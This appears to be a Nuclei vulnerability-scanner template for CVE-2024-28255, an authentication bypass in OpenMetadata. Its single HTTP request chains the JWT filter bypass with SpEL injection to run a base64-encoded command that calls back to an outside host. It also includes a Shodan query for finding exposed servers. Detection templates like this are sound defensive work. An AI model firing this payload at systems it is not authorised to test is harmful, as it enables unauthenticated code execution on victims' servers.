id: CVE-2024-28255

info:
  name: OpenMetadata - Authentication Bypass
  author: DhiyaneshDK,iamnooob
  severity: critical
  description: |
    OpenMetadata is a unified platform for discovery, observability, and governance powered by a central metadata repository, in-depth lineage, and seamless team collaboration. The `JwtFilter` handles the API authentication by requiring and verifying JWT tokens. When a new request comes in, the request's path is checked against this list. When the request's path contains any of the excluded endpoints the filter returns without validating the JWT. Unfortunately, an attacker may use Path Parameters to make any path contain any arbitrary strings. For example, a request to `GET /api/v1;v1%2fusers%2flogin/events/subscriptions/validation/condition/111` will match the excluded endpoint condition and therefore will be processed with no JWT validation allowing an attacker to bypass the authentication mechanism and reach any arbitrary endpoint, including the ones listed above that lead to arbitrary SpEL expression injection. This bypass will not work when the endpoint uses the `SecurityContext.getUserPrincipal()` since it will return `null` and will throw an NPE. This issue may lead to authentication bypass and has been addressed in version 1.2.4. Users are advised to upgrade. There are no known workarounds for this vulnerability. This issue is also tracked as `GHSL-2023-237`.
  impact: |
    Unauthenticated attackers can bypass authentication and gain unauthorized access to the OpenMetadata platform and its resources.
  remediation: |
    Update OpenMetadata to a version that patches CVE-2024-28255.
  reference:
    - https://github.com/open-metadata/OpenMetadata/blob/e2043a3f31312ebb42391d6c93a67584d798de52/openmetadata-service/src/main/java/org/openmetadata/service/security/JwtFilter.java#L111
    - https://github.com/open-metadata/OpenMetadata/blob/e2043a3f31312ebb42391d6c93a67584d798de52/openmetadata-service/src/main/java/org/openmetadata/service/security/JwtFilter.java#L113
    - https://github.com/open-metadata/OpenMetadata/security/advisories/GHSA-6wx7-qw5p-wh84
    - https://nvd.nist.gov/vuln/detail/CVE-2024-28255
    - https://github.com/wy876/wiki
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2024-28255
    cwe-id: CWE-287
    epss-score: 0.93995
    epss-percentile: 0.99885
  metadata:
    verified: true
    max-request: 1
    shodan-query: http.favicon.hash:733091897
  tags: cve,cve2024,openmetadata,rce,auth-bypass,vkev,vuln
variables:
  callback: "{{interactsh-url}}"
  cmd: "nslookup {{callback}}"
  payload: '{{base64(cmd)}}'

http:
  - raw:
      - |
        GET /api/v1;v1%2fusers%2flogin/events/subscriptions/validation/condition/T(java.lang.Runtime).getRuntime().exec(new%20java.lang.String(T(java.util.Base64).getDecoder().decode(%22{{payload}}%22))) HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - "status_code == 400"
          - "contains(interactsh_protocol, 'dns')"
          - 'contains(body, "java.lang.Boolean")'
          - 'contains(header, "application/json")'
        condition: and
# digest: 4a0a00473045022058078150c1a1eadb91b24bad0e671065c497928175830772aaed0ce92f083a91022100d14193f5b716fc56ad4e4f02b3a3b6b8aff7a6d8d0f7b978281b1967e44d5d7f:922c64590222798bb761d5b6d8e72950